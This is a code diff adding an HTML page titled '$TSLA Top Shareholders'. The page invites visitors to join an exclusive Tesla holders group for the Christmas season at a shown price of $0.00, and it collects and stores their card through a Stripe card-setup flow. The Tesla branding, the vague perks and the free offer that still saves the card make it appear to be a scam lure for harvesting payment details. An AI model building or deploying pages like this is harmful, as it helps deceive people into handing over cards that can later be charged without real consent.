@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>$TSLA Top Shareholders</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+body {
+  font-family: Helvetica, Arial, sans-serif;
+  background:#f5f5f5;
+}
+.card {
+  max-width:480px;
+  margin:50px auto;
+  background:#fff;
+  padding:40px;
+  border-radius:14px;
+  box-shadow:0 10px 30px rgba(0,0,0,.15);
+  text-align:center;
+}
+h1 { font-size:28px; font-weight:700; margin-bottom:10px; }
+p { font-size:15px; line-height:1.6; margin-bottom:25px; }
+img { width:100%; border-radius:10px; margin-bottom:30px; }
+.price { font-size:26px; font-weight:600; margin-bottom:25px; }
+#card-element { padding:14px; border:1px solid #ddd; border-radius:8px; }
+button {
+  margin-top:25px;
+  width:100%;
+  padding:16px;
+  font-size:16px;
+  font-weight:700;
+  border:none;
+  border-radius:8px;
+  background:#e82127;
+  color:white;
+  cursor:pointer;
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+  <h1>$TSLA Top Shareholders</h1>
+  <p>Secure your spot to connect with Tesla's top holders and enjoy exclusive benefits for the Tesla Christmas season.</p>
+
+  <img src="/static/tesla.png">
+
+  <div class="price">$0.00</div>
+
+  <div id="card-element"></div>
+
+  <button id="submit">JOIN</button>
+</div>
+
+<script src="https://js.stripe.com/v3/"></script>
+<script>
+const stripe = Stripe("{{ pk }}");
+const elements = stripe.elements();
+const card = elements.create("card");
+card.mount("#card-element");
+
+fetch("/create-setup-intent", {method:"POST"})
+.then(r=>r.json())
+.then(data=>{
+  document.getElementById("submit").onclick = async () => {
+    const result = await stripe.confirmCardSetup(
+      data.clientSecret,
+      { payment_method: { card: card } }
+    );
+    if (!result.error) {
+      window.location = "/success";
+    } else {
+      alert(result.error.message);
+    }
+  };
+});
+</script>
+
+</body>
+</html>
